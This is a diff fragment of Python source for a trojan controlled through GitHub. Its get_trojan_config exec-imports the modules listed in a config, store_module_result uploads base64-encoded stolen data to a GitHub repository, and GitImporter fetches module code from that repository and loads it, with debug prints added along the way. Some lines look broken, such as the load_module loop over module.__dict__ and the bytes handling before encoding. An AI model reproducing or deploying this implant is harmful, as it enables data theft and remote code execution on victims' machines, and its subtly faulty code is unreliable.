@@ -56,8 +56,11 @@ def get_trojan_config():
     print(decoded_json)
     config = json.loads(decoded_json)
     configured = True
-
+    print("CONFIG")
+    print(config)
     for task in config:
+
+
         if task['module'] not in sys.modules:
             exec("import {}".format(task["module"]))
 
@@ -67,25 +70,30 @@ def store_module_result(data):
 
     gh,repo,branch = connect_to_github()
     remote_path = "data/{}/{}.data".format(trojan_id,random.randint(1000,1000000))
-    repo.create_file(remote_path, "Message about confirm.", base64.b64encode(data))
+    repo.create_file(remote_path, "Message about confirm.", base64.b64encode(bytes.decode(data)))
 
     return
 
 
-class GitImporter:
+class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
 
     def find_module(self, fullname, path=None):
         if configured:
             print("Proba pobrania {}".format(fullname))
+            print(fullname)
+            if fullname == "_strptime":
+                return self
             new_library = get_file_contents("modules/{}".format(fullname))
 
             if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
+                print("that")
+                self.current_module_code = base64.b64decode(bytes.decode(new_library))
                 return self
 
-            return None
+        return None
+
     def load_module(self, name):
         module = imp.new_module(name)
         for self.current_module_code in module.__dict__:
